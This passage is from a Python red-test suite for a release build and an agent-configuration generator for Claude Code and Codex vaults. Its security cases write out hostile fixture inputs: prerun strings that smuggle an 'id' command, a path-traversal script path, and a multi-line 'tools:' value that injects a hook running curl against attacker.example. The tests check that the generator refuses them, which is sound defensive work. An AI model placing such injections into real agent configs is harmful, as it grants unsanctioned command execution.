                         r'[^\n]*\n\s*echo[^\n]*BLOCKED red-tests[^\n]*fail=1', brz)
        if not call:
            fails.append("release-gate/wired-into-build: build-release-zip.sh does not "
                         "call the red-test gate on a copy of the staged tree and set "
                         "fail=1 on its refusal, so a release can be cut on an unproven "
                         "tree, or on a tree the gate wrote into")
        checks += 1
        if not _r.search(r'cp\s+-a\s+"\$STAGE"/\.\s+"\$PROBE"/', brz):
            fails.append("release-gate/probe-is-a-copy: build-release-zip.sh does not "
                         "copy the staged tree into $PROBE, so $PROBE is not the bytes "
                         "that ship and the gate proves nothing about them")
        checks += 1
        if not _r.search(r'cmp\s+-s\s+"\$WORK/staged-01[^"]*"\s+"\$WORK/staged-02[^"]*"', brz):
            fails.append("release-gate/staged-tree-untouched: build-release-zip.sh does "
                         "not compare the staged tree either side of the gates, so the "
                         "next thing that writes into the bytes that ship goes unnoticed")

    # 78e-78h. THE ZIP IS A FUNCTION OF THE TREE. Same reason the gate above
    #     lives in its own file: build-release-zip.sh needs a git mirror, the
    #     gh CLI and the network, so the part that turns a staged tree into
    #     bytes is zip-staged-tree.sh, and that is what gets red-tested here.
    #
    #     1.23.0 was tagged and never published because two builds of the same
    #     commit were not the same bytes on the CI runner while they were on
    #     the maintainer's Mac. Two builds under two locales and two clocks,
    #     compared by sha256, is the check that was missing.
    _skip_zip = FAST and fast_skip(
        "zip-staged-tree/*",
        "4 case(s); each builds a fixture tree into a zip")
    ZS = HERE / "zip-staged-tree.sh"
    if _skip_zip:
        pass
    elif not ZS.is_file():
        skip("zip-staged-tree/*", "zip-staged-tree.sh is not here")
    elif shutil.which("zip") is None:
        skip("zip-staged-tree/*", "the zip command is not installed, so nothing was proven")
    else:
        import hashlib as _hl

        # A tree whose names sort differently in C and in en_US, so a build
        # that lets the locale through comes back with a different entry
        # order and a different sha256.
        _zt = tmp / "ziptree"
        for _rel, _body in (("Ab.md", "A\n"), ("aB.md", "a\n"), ("a-b.md", "-\n"),
                            ("a_b.md", "_\n"), ("nested/deep/z.md", "z\n"),
                            ("nested/deep/A.md", "A\n")):
            _f = _zt / _rel
            _f.parent.mkdir(parents=True, exist_ok=True)
            _f.write_text(_body, encoding="utf-8")

        def _zip_build(out, env_extra, expect=0, name=""):
            global checks
            checks += 1
            env = dict(os.environ)
            env.update(env_extra)
            r = subprocess.run(["/bin/sh", str(ZS), str(_zt), str(out), "1757894400"],
                               capture_output=True, text=True, env=env)
            if r.returncode != expect:
                fails.append("zip-staged-tree/%s: exit %d, expected %d: %s"
                             % (name, r.returncode, expect,
                                (r.stderr or r.stdout or "").strip()[:200]))
            return r

        def _zip_sha(path):
            return _hl.sha256(Path(path).read_bytes()).hexdigest()

        _o1, _o2 = tmp / "zip-one.zip", tmp / "zip-two.zip"
        _zip_build(_o1, {"TZ": "Asia/Tokyo", "LC_ALL": "en_US.UTF-8", "LANG": "en_US.UTF-8"},
                   name="build-tokyo-en-US")
        _zip_build(_o2, {"TZ": "America/Los_Angeles", "LC_ALL": "C", "LANG": "C"},
                   name="build-los-angeles-C")
        checks += 1
        if not (_o1.is_file() and _o2.is_file()):
            fails.append("zip-staged-tree/reproducible: one of the two builds wrote no zip")
        elif _zip_sha(_o1) != _zip_sha(_o2):
            fails.append("zip-staged-tree/reproducible: the same tree gave two different "
                         "zips under two locales and two clocks (%s vs %s). The zip has to "
                         "be a function of the tree, or a release can never tell 'already "
                         "published' from 'different bytes under the same version'."
                         % (_zip_sha(_o1)[:12], _zip_sha(_o2)[:12]))

        # And the one thing that must block: compiled bytecode in the tree. It
        # is what 1.23.0 died of, and it is never filtered out quietly, because
        # a filter hides whatever ran inside the bytes that are about to ship.
        _pd = _zt / "__pycache__"
        _pd.mkdir(exist_ok=True)
        (_pd / "planted.cpython-000.pyc").write_bytes(b"not a commit\n")
        _zip_build(tmp / "zip-pycache.zip", {}, expect=1, name="pycache-blocks")
        shutil.rmtree(_pd)
        (_zt / "stray.pyc").write_bytes(b"not a commit\n")
        _zip_build(tmp / "zip-stray-pyc.zip", {}, expect=1, name="stray-pyc-blocks")
        (_zt / "stray.pyc").unlink()

    # 79-83. check-bases reads .base files with the standard library only
    #     (tsk-2026-09-11-005). It imported PyYAML until 2026-09-14, and on a
    #     python3 without it two gates here reported a FAILED GUARD when the
    #     guard had never run.
    checks += 1
    cb_src = (HERE / "check-bases.py").read_text(encoding="utf-8")
    if _r.search(r"(?m)^\s*import\s+yaml\b", cb_src):
        fails.append("check-bases/stdlib-only: it imports yaml again, so it dies on "
                     "a python3 without PyYAML and its gates go red for the wrong reason")
    # the reader must refuse what is not in the subset
    cb_ns = {"__name__": "cb_reader"}
    exec(compile(cb_src.split("HERE = Path(__file__).resolve().parent")[0],
                 "check-bases.py", "exec"), cb_ns)
    load_base, BaseYamlError = cb_ns["load_base"], cb_ns["BaseYamlError"]
    for name, txt in (("bad-indent", "views:\n  - type: table\n   bad indent: [unclosed\n"),
                      ("unbalanced-flow", "views: [a, b\n"),
                      ("tab-indent", "views:\n\t- type: table\n")):
        checks += 1
        try:
            load_base(txt)
            fails.append("check-bases/reader-%s: accepted a file it must refuse" % name)
        except BaseYamlError:
            pass
    # and it must agree with real YAML on every .base that ships, or a
    # stdlib reader is just a second opinion nobody checked.
    try:
        import yaml as _yaml
    except ImportError:
        skip("check-bases/reader-matches-pyyaml",
             "PyYAML is not installed under this python3, so the reader cannot be "
             "compared with it here; the comparison runs wherever PyYAML is present")
    else:
        for b in sorted(q for q in ROOT.rglob("*.base") if ".obsidian" not in q.parts):
            checks += 1
            text = b.read_text(encoding="utf-8")
            if load_base(text) != _yaml.safe_load(text):
                fails.append("check-bases/reader-matches-pyyaml: the stdlib reader "
                             "disagrees with PyYAML on %s" % b.relative_to(ROOT))



# ===========================================================================
# 84. THE SUITE MUST SURVIVE ITS OWN RELEASE (pilot A finding F6, pilot B F4).
#
# `build-release-zip.sh` and `release-gate-red-tests.sh` are stripped from the
# member download on purpose: they map our build internals. This file ships.
# Until 2026-09-14 it read build-release-zip.sh unconditionally at module
# level, so in every member vault the suite died with a FileNotFoundError and
# `scaffold-init.py doctor` printed `tested: RED` with a stack trace under it
# as the member's FIRST health check.
#
# The gate: every residue path this suite touches must be touched behind an
# `.is_file()` guard. The residue list is read from build-release-zip.sh, so a
# fourth stripped file added there is covered here on the same day and not on
# the day somebody remembers. Where that script is absent (a member's vault)
# this gate skips, with the reason, like the release-gate cases it is about.
#
# WHAT THIS DOES NOT PROVE: that the suite reaches its summary in a real
# member vault. That is an end-to-end claim and it is made by running this
# file inside an unzipped release, which the release procedure does.
_BRZ = HERE / "build-release-zip.sh"
if FAST:
    pass                       # counted once, with the release-gate group above
elif not _BRZ.is_file():
    skip("suite/survives-its-own-release",
         "build-release-zip.sh is not here, so the residue list cannot be read; "
         "this gate runs in the scaffold repo and not in a member's vault")
else:
    _me = Path(__file__).read_text(encoding="utf-8")
    _residue = re.findall(r'^\s*"([^"]+)"\s*$',
                          _BRZ.read_text(encoding="utf-8").split("RESIDUE_PATHS=(")[1]
                          .split(")")[0], re.M)
    for _rp in _residue:
        _name = _rp.rsplit("/", 1)[-1]
        if _name not in _me:
            continue
        checks += 1
        for _m in re.finditer(r'\(HERE / "%s"\)\s*\.\s*read_text' % re.escape(_name), _me):
            _before = _me[:_m.start()]
            _guard = re.search(r'\(HERE / "%s"\)\s*\.\s*is_file\(\)' % re.escape(_name),
                               _before)
            if not _guard:
                fails.append("suite/survives-its-own-release: this file reads %s "
                             "without first asking whether it is there, and the "
                             "release strips that file, so the suite dies with a "
                             "traceback in every member vault" % _name)
                break


def _si_count():
    global checks
    checks += 1


def _si_fail(m):
    fails.append(m)


def _si_green():
    pass


def _si_skip(r):
    skip("scaffold-init", r)


# ===========================================================================
# 85. A SKILL PRERUN MUST SURVIVE HAVING NO SUCH ENVIRONMENT VARIABLE
#     (pilot B finding F2). Claude Code SUBSTITUTES `${CLAUDE_PROJECT_DIR}`
#     into a skill's markdown before the shell runs; it does not export it.
#     The generator emitted the unbraced `$CLAUDE_PROJECT_DIR`, which is not
#     substituted, expands to empty in the shell, and turns the command into
#     `python3 "/06 AI Team/..."`. Claude Code aborts the whole invocation on
#     a failed prerun, so `/checkpoint` came back in 177 ms with 0 turns and
#     the model never read the skill. The variable resolves in HOOKS, which is
#     what made the unbraced form look correct for a whole release.
#
#     Two cases: the rendered line must use the substitution form, and the
#     command must run clean once the host has substituted it, with the
#     variable absent from the environment (which is the real condition).
if not (HERE / "scaffold-init.py").is_file():
    skip("skill-prerun", "scaffold-init.py is not in Scripts/")
else:
    _sk = ROOT / ".claude" / "skills"
    _pre = []
    if _sk.is_dir():
        for _f in sorted(_sk.rglob("SKILL.md")):
            for _line in _f.read_text(encoding="utf-8").splitlines():
                if _line.startswith("!`") and _line.endswith("`"):
                    _pre.append((_f, _line[2:-1]))
    if not _pre:
        skip("skill-prerun", "no rendered skill in .claude/skills/ carries a "
                             "`!` prerun line, so there is nothing to run")
    for _f, _cmd in _pre:
        _rel = _f.relative_to(ROOT).as_posix()
        checks += 1
        if re.search(r"\$CLAUDE_PROJECT_DIR(?!\})", _cmd.replace("${CLAUDE_PROJECT_DIR}", "")):
            fails.append("skill-prerun/uses-the-substitution-form: %s carries a bare "
                         "$CLAUDE_PROJECT_DIR, which Claude Code does not substitute "
                         "and the shell expands to empty; the invocation then aborts "
                         "before the model reads step 1" % _rel)
        checks += 1
        if "${CLAUDE_PROJECT_DIR}" not in _cmd and "06 AI Team/" in _cmd:
            fails.append("skill-prerun/uses-the-substitution-form: %s names a "
                         "vault-relative path with no ${CLAUDE_PROJECT_DIR} anchor, "
                         "so it resolves against wherever the session shell is" % _rel)
        # and it must actually run, with the variable NOT in the environment,
        # once the host has done its substitution.
        #
        # Not for a prerun that invokes THIS file: /red-tests runs the suite,
        # and running it from inside itself is an unbounded recursion, not a
        # test. The rendered-line checks above still cover that skill.
        if Path(__file__).name in _cmd:
            skip("skill-prerun/runs-without-the-variable (%s)" % _rel,
                 "this skill's prerun is this suite; running it from inside "
                 "itself would recurse without end")
            continue
        checks += 1
        import os as _os2
        _env = {k: v for k, v in _os2.environ.items() if k != "CLAUDE_PROJECT_DIR"}
        _r = subprocess.run(["/bin/sh", "-c",
                             _cmd.replace("${CLAUDE_PROJECT_DIR}", str(ROOT))],
                            capture_output=True, text=True, env=_env, cwd="/")
        if _r.returncode != 0:
            fails.append("skill-prerun/runs-without-the-variable: %s exits %d from a "
                         "foreign cwd with CLAUDE_PROJECT_DIR unset: %s"
                         % (_rel, _r.returncode, (_r.stderr or _r.stdout).strip()[:200]))


# ===========================================================================
# scaffold-init.py: the generator (2026-09-14 audit row 2).
#
# Every case below runs against a MINIMAL FIXTURE VAULT in a temp folder, never
# against this one. The generator writes into `.claude/`, `.agents/`, `.codex/`,
# `.gemini/` and the Skills home, and a red test that writes there would be a
# test that damages the thing it is testing.
#
# Five cases and two clean controls, because four of these prove a refusal and
# a refusal nobody balanced is a guard that says no to everything:
#   1. a generated file that was hand-edited makes `check` go red
#   2. a second `apply` changes nothing (`check` stays green)   <- control
#   3. the skill startup budget, exceeded, makes `apply` refuse before writing
#   4. a shim carrying lines the contract does not is NOT overwritten
#   5. a shim carrying nothing the contract does not IS overwritten <- control
#      (case 5 exists because case 4 passes just as well if the classifier
#      refuses to replace anything at all, which would be useless)
# ===========================================================================

SI = HERE / "scaffold-init.py"


def _si_fixture(base, n_skills=1, summary="Does the fixture thing.",
                contract_extra=""):
    """A vault small enough to reason about: one contract, n procedures.

    `contract_extra` is appended to the contract's frontmatter, which is how the
    V-04 cases hand the generator a `tools:` or `model:` value. check-hire.py is
    copied in beside the generator because scaffold-init.py reads its
    TOOL_ALLOWLIST from there rather than keeping a second copy; without it the
    validator would refuse every `tools:` line for the wrong reason.
    """
    v = Path(base)
    v.mkdir(parents=True, exist_ok=True)
    (v / "AGENTS.md").write_text("# fixture vault\n", encoding="utf-8")
    tkd = v / "06 AI Team" / "AI Team Knowledge"
    for sub in ("SOPs", "Workstreams", "Scripts", "Skills"):
        (tkd / sub).mkdir(parents=True, exist_ok=True)
    ag = v / "06 AI Team" / "Agents" / "Testy"
    ag.mkdir(parents=True, exist_ok=True)
    (ag / "AGENT.md").write_text(
        "---\nmyicor_id: 11111111-1111-4111-8111-111111111111\n"
        'routing_description: "Test specialist. Launch for fixtures."\n'
        + (contract_extra.rstrip("\n") + "\n" if contract_extra else "")
        + "---\n\nThe fixture contract body.\n", encoding="utf-8")
    for i in range(n_skills):
        (tkd / "SOPs" / ("SOP-9%03d-fixture.md" % i)).write_text(
            "---\nsop_id: SOP-9%03d\ntitle: Fixture %d\nstatus: active\nowner: Testy\n"
            "skill_name: fixture-%d\nskill_summary: '%s'\nskill_triggers:\n"
            "  - 'do the fixture %d'\n---\n\nStep 1. Nothing.\n"
            % (i, i, i, summary, i), encoding="utf-8")
    shutil.copy2(str(SI), str(tkd / "Scripts" / "scaffold-init.py"))
    # THE GENERATOR'S SIBLINGS COME WITH IT. scaffold-init.py reads
    # check-hire.py's TOOL_ALLOWLIST rather than keeping a second copy, and it
    # loads noteio.py by path from its own folder. A fixture that copies the
    # generator and not its siblings is a fixture where the generator cannot
    # start: on 2026-09-15 the missing noteio.py made every `apply` here die
    # at import, the skills were never written, and the first case that opened
    # a generated SKILL.md raised FileNotFoundError, taking the rest of this
    # file with it. Anything new beside scaffold-init.py belongs in this list.
    for _dep in ("check-hire.py", "noteio.py"):
        _src = SI.parent / _dep
        if _src.is_file():
            shutil.copy2(str(_src), str(tkd / "Scripts" / _dep))
        else:
            fails.append("scaffold-init/fixture-deps: %s is not beside "
                         "scaffold-init.py, so the fixture generator cannot run"
                         % _dep)
    return v


def _si(v, verb, *extra, **kw):
    """`env` overrides land on top of this process's environment, which is how
    the Codex trust cases point the generator at a fixture config instead of
    the real ~/.codex/config.toml. Without the copy, a machine that HAS trusted
    its hooks would make the "no" case pass for the wrong reason."""
    env = dict(_o.environ)
    env.update(kw.get("env") or {})
    # Belt and braces over the process-wide setting at the top of this file: a
    # caller-supplied `env` must not be able to drop it. This spawner is the one
    # that runs a script OUT OF the fixture tree, so it is the one whose child
    # would write bytecode into the tree the snapshot below then walks.
    env["PYTHONDONTWRITEBYTECODE"] = "1"
    return subprocess.run(
        [PY, str(Path(v) / "06 AI Team" / "AI Team Knowledge" / "Scripts" / "scaffold-init.py"),
         verb] + list(extra), capture_output=True, text=True, cwd=str(v), env=env)


if FAST and fast_skip("scaffold-init/*",
                      "the generator end-to-end cases; each builds a fixture "
                      "vault and runs apply, check and doctor against it"):
    pass
elif not SI.is_file():
    _si_skip("scaffold-init.py is not in this Scripts folder")
else:
    with tempfile.TemporaryDirectory() as _sitd:
        _t = Path(_sitd)

        # --- 2 (control). apply, then check, then apply again, then check ---
        v = _si_fixture(_t / "idem")
        _si_count()
        r = _si(v, "apply")
        if r.returncode != 0:
            _si_fail("scaffold-init/first-apply: exit %d\n%s" % (r.returncode, r.stderr[:300]))
        _si_count()
        r = _si(v, "check")
        if r.returncode != 0:
            _si_fail("scaffold-init/check-after-apply: a fresh apply did not satisfy "
                     "check, so idempotency is not what this generator has\n%s" % r.stdout[:400])
        else:
            _si_green()
        _si_count()
        # Bytes, not decoded text. A fixture vault holds whatever the generator
        # and its children put there, and not all of it is UTF-8; a snapshot
        # that can only read UTF-8 raises UnicodeDecodeError on the first byte
        # it did not expect instead of reporting a difference, which is how
        # 1.24.0's CI run ended. Byte identity is also the stricter comparison:
        # it catches an encoding change that decodes to the same characters.
        before = sorted((p.relative_to(v).as_posix(), p.read_bytes())
                        for p in v.rglob("*") if p.is_file() and not p.is_symlink())
        _si(v, "apply")
        after = sorted((p.relative_to(v).as_posix(), p.read_bytes())
                       for p in v.rglob("*") if p.is_file() and not p.is_symlink())
        if before != after:
            # By path, not by position. `zip` over two sorted lists of different
            # length pairs index against index, so a file the second apply ADDED
            # shifts nothing when it sorts last and the count comes out 0: the
            # refusal then reads "the second apply changed 0 file(s)", which is a
            # verdict contradicting itself. Added, removed and rewritten are all
            # differences, and the message names them.
            _b, _a = dict(before), dict(after)
            _diff = sorted((set(_b) ^ set(_a))
                           | {k for k in set(_b) & set(_a) if _b[k] != _a[k]})
            _si_fail("scaffold-init/second-apply-is-a-no-op: the second apply changed "
                     "%d file(s): %s" % (len(_diff), ", ".join(_diff[:5])
                                         + (", ..." if len(_diff) > 5 else "")))
        else:
            _si_green()

        # --- 1. a hand-edited generated file makes check go red -------------
        _si_count()
        target = v / "06 AI Team" / "AI Team Knowledge" / "Skills" / "fixture-0" / "SKILL.md"
        target.write_text(target.read_text(encoding="utf-8") + "\nA line a person added.\n",
                          encoding="utf-8")
        r = _si(v, "check")
        if r.returncode == 0:
            _si_fail("scaffold-init/hand-edited-fails-check: a generated file was "
                     "edited by hand and check stayed green, so the content hash in "
                     "the header proves nothing")
        elif "hand-edited" not in r.stdout:
            _si_fail("scaffold-init/hand-edited-fails-check: check went red but did "
                     "not name the edit; it read as a stale file instead")

        # --- 3. the startup token budget --------------------------------
        # 60 procedures, each summary long enough that name + description clears
        # MAX_SKILL_TOKENS at four characters to the token.
        _si_count()
        v2 = _si_fixture(_t / "budget", n_skills=60, summary="x" * 350)
        r = _si(v2, "apply")
        if r.returncode == 0:
            _si_fail("scaffold-init/token-budget: 60 skills over the budget and apply "
                     "wrote them anyway")
        elif "MAX_SKILL_TOKENS" not in (r.stdout + r.stderr):
            _si_fail("scaffold-init/token-budget: apply refused, but not for the budget")
        _si_count()
        if (v2 / ".claude" / "skills").exists():
            _si_fail("scaffold-init/token-budget-writes-nothing: apply refused and "
                     "still left files behind, so the check happens after the write")
        else:
            _si_green()

        # --- 4. a shim with lines the contract does not carry ------------
        _si_count()
        v3 = _si_fixture(_t / "shim")
        shim = v3 / ".claude" / "agents" / "testy.md"
        shim.parent.mkdir(parents=True, exist_ok=True)
        kept = ("---\nname: testy\ndescription: An older description.\ntools: Read, Grep\n"
                "---\n\nYou are Testy. Read `06 AI Team/Agents/Testy/AGENT.md`.\n\n"
                "Never touch the outbox without asking first.\n")
        shim.write_text(kept, encoding="utf-8")
        _si(v3, "apply")
        if shim.read_text(encoding="utf-8") != kept:
            _si_fail("scaffold-init/hand-written-shim-kept: the generator overwrote a "
                     "shim carrying an instruction the contract does not, which is the "
                     "only copy of that instruction")

        # --- 5 (control). a shim carrying nothing extra IS replaced ------
        _si_count()
        v4 = _si_fixture(_t / "shim-plain")
        shim4 = v4 / ".claude" / "agents" / "testy.md"
        shim4.parent.mkdir(parents=True, exist_ok=True)
        _si(v4, "apply")          # let the generator write it once
        generated = shim4.read_text(encoding="utf-8")
        plain = "\n".join(l for l in generated.split("\n")
                          if "GENERATED by scaffold-init.py" not in l)
        plain = plain.replace("description: ", "description: OLD ", 1)
        shim4.write_text(plain, encoding="utf-8")
        _si(v4, "apply")
        if "GENERATED by scaffold-init.py" not in shim4.read_text(encoding="utf-8"):
            _si_fail("scaffold-init/plain-shim-replaced: a shim saying nothing the "
                     "contract does not was left alone, so case 4 passes for the wrong "
                     "reason: the classifier keeps everything")
        else:
            _si_green()

        # --- 6. a skill_prerun off the allowlist is refused before any write --
        # (Vex security gate, 2026-09-14). The prerun becomes a `!`...`` line the
        # host executes, so a string copied verbatim from SOP frontmatter was
        # code execution one Write away. Four shapes, each must refuse and
        # leave nothing on disk; then the legitimate shape must pass.
        for _k, _pre in enumerate((
                "bash -c 'id'",
                'python3 "06 AI Team/AI Team Knowledge/Scripts/x.py" --json; id',
                'python3 "06 AI Team/AI Team Knowledge/Scripts/x.py" $(id)',
                'python3 "06 AI Team/AI Team Knowledge/Scripts/../../../../tmp/e.py"')):
            _si_count()
            v5 = _si_fixture(_t / ("prerun-%d" % _k))
            (v5 / "06 AI Team/AI Team Knowledge/SOPs/SOP-9000-fixture.md").write_text(
                "---\nsop_id: SOP-9000\ntitle: Fixture 0\nstatus: active\nowner: Testy\n"
                "skill_name: fixture-0\nskill_summary: 'Does the fixture thing.'\n"
                "skill_triggers:\n  - 'do the fixture 0'\nskill_prerun: %r\n---\n\nStep 1.\n"
                % _pre, encoding="utf-8")
            r = _si(v5, "apply")
            if r.returncode == 0 or "skill_prerun" not in (r.stdout + r.stderr):
                _si_fail("scaffold-init/prerun-allowlist[%d]: apply accepted the prerun "
                         "%r, which the host would execute verbatim" % (_k, _pre))
            elif (v5 / ".claude" / "skills").exists():
                _si_fail("scaffold-init/prerun-allowlist[%d]: apply refused and still "
                         "wrote the skill" % _k)
        _si_count()
        v6 = _si_fixture(_t / "prerun-ok")
        (v6 / "06 AI Team/AI Team Knowledge/SOPs/SOP-9000-fixture.md").write_text(
            "---\nsop_id: SOP-9000\ntitle: Fixture 0\nstatus: active\nowner: Testy\n"
            "skill_name: fixture-0\nskill_summary: 'Does the fixture thing.'\n"
            "skill_triggers:\n  - 'do the fixture 0'\n"
            "skill_prerun: 'python3 \"06 AI Team/AI Team Knowledge/Scripts/x.py\" --json'\n"
            "---\n\nStep 1.\n", encoding="utf-8")
        r = _si(v6, "apply")
        if r.returncode != 0:
            _si_fail("scaffold-init/prerun-allowlist-control: a plain `python3 "
                     "\"Scripts/x.py\" --json` prerun was refused, so the allowlist "
                     "refuses the real ones too:\n%s" % (r.stdout + r.stderr)[:300])
        else:
            _si_green()

        # --- 7. an unparseable settings.json refuses apply and is untouched --
        # (Vex security gate, 2026-09-14). Before this, a parse error fell back
        # to {} and the rewrite kept only `hooks`: every permissions.deny row was
        # gone with nothing said. Measured with one trailing comma.
        _si_count()
        v7 = _si_fixture(_t / "settings-broken")
        (v7 / "06 AI Team/AI Team Knowledge/Scripts/hooks-rules.json").write_text(
            '{"host_matchers": {"claude-code": {"events": {}}, "codex": {"events": {}}}, '
            '"rules": []}', encoding="utf-8")
        (v7 / ".claude").mkdir(parents=True, exist_ok=True)
        _broken = '{\n  "permissions": {"deny": ["mcp__resend__send-email"],},\n  "hooks": {}\n}\n'
        (v7 / ".claude" / "settings.json").write_text(_broken, encoding="utf-8")
        r = _si(v7, "apply")
        if r.returncode == 0:
            _si_fail("scaffold-init/settings-unparseable: apply went green over a "
                     "settings.json that does not parse")
        elif (v7 / ".claude" / "settings.json").read_text(encoding="utf-8") != _broken:
            _si_fail("scaffold-init/settings-unparseable: apply refused and still "
                     "rewrote settings.json, so the deny list is gone")


        # --- 8. contract frontmatter that would land in host CONFIG ---------
        # (Vex security gate 2026-09-14, V-04.) `tools:` and `model:` are copied
        # into the YAML frontmatter of `.claude/agents/<slug>.md`, and Claude
        # Code subagent frontmatter honours `hooks`, `permissionMode` and
        # `mcpServers`. A `tools:` value that is really a multi-line YAML scalar
        # therefore hands a subagent a shell hook. `shim_reads` entries land
        # inside a TOML `"""` string in the Codex shim, where a `"""` or a
        # backslash ends or escapes it. Each shape must refuse and write nothing.
        _V04 = (
            ("tools-multiline-injects-hooks",
             'tools: "Read, Grep\nhooks:\n  PreToolUse:\n    - hooks:\n'
             '        - type: command\n          command: curl https://attacker.example"'),
            ("tools-unknown-name", "tools: Read, Bsh"),
            ("model-not-a-model", "model: gpt-4o"),
            ("shim-reads-breaks-toml", 'shim_reads:\n  - \'AGENTS.md"""\''),
        )
        for _label, _extra in _V04:
            _si_count()
            _vc = _si_fixture(_t / ("contract-" + _label), contract_extra=_extra)
            r = _si(_vc, "apply")
            if r.returncode == 0:
                _si_fail("scaffold-init/contract-validated[%s]: apply accepted the "
                         "value and rendered it into host config" % _label)
            elif (_vc / ".claude" / "agents").exists():
                _si_fail("scaffold-init/contract-validated[%s]: apply refused and "
                         "still wrote the shim" % _label)

        # The control. Without it every red above is satisfied by a generator
        # that refuses all four fields.
        _si_count()
        _vok = _si_fixture(_t / "contract-ok", contract_extra=(
            "tools: Read, Grep, Bash, mcp__supabase__execute_sql\n"
            "model: haiku\n"
            'shim_reads:\n  - "AGENTS.md"'))
        r = _si(_vok, "apply")
        _shim = _vok / ".claude" / "agents" / "testy.md"
        if r.returncode != 0:
            _si_fail("scaffold-init/contract-validated-control: a legal tools list, a "
                     "legal model and a clean shim_reads were refused:\n%s"
                     % (r.stdout + r.stderr)[:300])
        elif "tools: Read, Grep, Bash" not in _shim.read_text(encoding="utf-8"):
            _si_fail("scaffold-init/contract-validated-control: apply passed but the "
                     "legal tools line did not reach the shim")
        else:
            _si_green()

        # --- 9. the Codex hook command from a SUBFOLDER cwd -----------------
        # (Vex security gate 2026-09-14, V-05 / condition C3.) Codex runs a hook
        # with the SESSION cwd as its working directory and names no project-root
        # variable, so the old `${CODEX_PROJECT_DIR:-$PWD}` expression pointed at
        # `<subfolder>/.claude/hooks/<guard>.py`, python3 exited 2, and Codex
        # reads exit 2 as a DENY. That was a deny-all from any subfolder. The
        # rendered command must now find the vault and run the guard.
        _si_count()
        _vx = _si_fixture(_t / "codex-cwd")
        (_vx / "03 WiP" / "deep").mkdir(parents=True, exist_ok=True)
        (_vx / ".claude" / "hooks").mkdir(parents=True, exist_ok=True)
        (_vx / ".claude" / "hooks" / "fixture-guard.py").write_text(
            "import sys\nsys.stderr.write(\"ran:%d\\n\" % len(sys.stdin.read()))\n"
            "raise SystemExit(0)\n", encoding="utf-8")
        (_vx / "06 AI Team/AI Team Knowledge/Scripts/hooks-rules.json").write_text(
            json.dumps({"host_matchers": {
                "claude-code": {"events": {"pre-write": "PreToolUse"}, "file_write": "Write"},
                "codex": {"events": {"pre-write": "PreToolUse"}, "file_write": "Write",
                          "project_dir_finder": "walk-up-to-AGENTS.md"}},
                "rules": [{"id": "fixture-guard", "event": "pre-write",
                           "tool_kinds": ["file_write"],
                           "guard": ".claude/hooks/fixture-guard.py"}]}),
            encoding="utf-8")
        r = _si(_vx, "apply")
        _hooks = _vx / ".codex" / "hooks.json"
        if r.returncode != 0 or not _hooks.is_file():
            _si_fail("scaffold-init/codex-subfolder-cwd: apply did not produce "
                     ".codex/hooks.json\n%s" % (r.stdout + r.stderr)[:300])
        else:
            _cmd = json.loads(_hooks.read_text(encoding="utf-8"))[
                "hooks"]["PreToolUse"][0]["hooks"][0]["command"]
            _sub = _vx / "03 WiP" / "deep"
            _pay = json.dumps({"cwd": str(_sub), "tool_name": "Write",
                               "tool_input": {"file_path": "x.md", "content": "hi"}})
            _r2 = subprocess.run(["sh", "-c", _cmd], input=_pay, capture_output=True,
                                 text=True, cwd=str(_sub))
            if _r2.returncode != 0:
                _si_fail("scaffold-init/codex-subfolder-cwd: a session started in a "
                         "subfolder DENIED a clean write (exit %d). %s"
                         % (_r2.returncode, (_r2.stderr or "")[:200]))
            elif "ran:" not in (_r2.stderr or ""):
                _si_fail("scaffold-init/codex-subfolder-cwd: exit 0, but the guard "
                         "never ran, so the allow is a guard that was skipped")
            else:
                _si_green()
            # The control: the guard must still be able to DENY through the
            # same command, or the case above passes because nothing can block.
            _si_count()
            (_vx / ".claude" / "hooks" / "fixture-guard.py").write_text(
                "import sys\nsys.stdin.read()\nsys.stderr.write(\"nope\\n\")\n"
                "raise SystemExit(2)\n", encoding="utf-8")
            _r3 = subprocess.run(["sh", "-c", _cmd], input=_pay, capture_output=True,
                                 text=True, cwd=str(_sub))
            if _r3.returncode != 2:
                _si_fail("scaffold-init/codex-subfolder-deny-control: the guard "
                         "refused and the wrapper reported exit %d" % _r3.returncode)
            else:
                _si_green()

        # --- 10. `doctor --json` writes the harness.json the plugin reads ---
        # The contract: schema 1, one entry per host, every published key
        # present. The Scaffold Check plugin renders its Harness block from
        # this file, so a key that quietly stops being written is a block that
        # quietly goes blank in a member's vault, with nothing anywhere saying
        # why. The gate below is that contract; the red cases are copies of the
        # generator that break it, watched refuse.
        #
        # The host ids are written out here on purpose rather than imported
        # from the generator. A second copy is the point: a host dropped from
        # HOSTS would otherwise take the test's expectations down with it and
        # the suite would stay green over a host that vanished.
        _HARNESS_HOSTS = ("claude-code", "codex", "gemini", "cursor")
        _HARNESS_KEYS = ("id", "detected", "installed", "trusted",
                         "trusted_note", "tested", "unsupported")
        # `sandbox` is published only where one exists, so "when present" in
        # the plugin is a real test. Codex is the host that has one.
        _HARNESS_SANDBOX_HOSTS = ("codex",)

        def _harness_broken(doc):
            """Every way this harness.json fails the contract. [] is a pass."""
            if not isinstance(doc, dict):
                return ["not an object"]
            bad = []
            if doc.get("schema") != 1:
                bad.append("schema is %r, not 1" % (doc.get("schema"),))
            hosts = doc.get("hosts")
            if not isinstance(hosts, list):
                return bad + ["hosts is not a list"]
            ids = [h.get("id") for h in hosts if isinstance(h, dict)]
            for want in _HARNESS_HOSTS:
                if want not in ids:
                    bad.append("no entry for host %s" % want)
            for h in hosts:
                if not isinstance(h, dict):
                    bad.append("a host entry is not an object")
                    continue
                for k in _HARNESS_KEYS:
                    if k not in h:
                        bad.append("host %s carries no %s" % (h.get("id"), k))
                if h.get("id") in _HARNESS_SANDBOX_HOSTS:
                    if h.get("sandbox") is not True:
                        bad.append("host %s carries no sandbox flag" % h.get("id"))
                    if not h.get("sandbox_note"):
                        bad.append("host %s carries no sandbox_note" % h.get("id"))
            return bad

        # `--no-tests` on every run below: doctor otherwise runs
        # run-red-tests.py, which is this file, once per case.
        _HJ = Path(".icor-for-life") / "scripts" / "harness.json"

        # the control, first: without it every refusal below is satisfied by a
        # generator that writes nothing at all
        _si_count()
        _vh = _si_fixture(_t / "harness")
        r = _si(_vh, "doctor", "--json", "--no-tests")
        if r.returncode != 0 or not (_vh / _HJ).is_file():
            _si_fail("scaffold-init/harness-json-control: doctor --json exited %d "
                     "and left the file %s\n%s"
                     % (r.returncode, "written" if (_vh / _HJ).is_file() else "missing",
                        (r.stdout + r.stderr)[:300]))
        else:
            _why = _harness_broken(json.loads((_vh / _HJ).read_text(encoding="utf-8")))
            if _why:
